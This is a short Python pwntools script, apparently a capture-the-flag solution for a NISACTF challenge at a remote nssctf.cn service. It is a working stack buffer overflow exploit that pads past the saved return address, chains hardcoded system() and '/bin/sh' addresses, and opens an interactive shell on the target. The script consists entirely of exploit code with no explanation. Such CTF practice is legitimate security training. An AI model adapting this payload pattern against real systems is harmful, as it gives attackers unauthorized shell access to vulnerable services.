from pwn import *

context(arch="i386", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"

binsh_addr = 0x0804A024
system_addr = 0x08048512

# io = process("./pwn")
io = connect("node5.anna.nssctf.cn", 20547)

io.recvuntil(b"Welcome to NISACTF")
payload = b"a" * (0x48 + 0x4) + p32(system_addr) + p32(binsh_addr)
io.sendline(payload)
io.interactive()
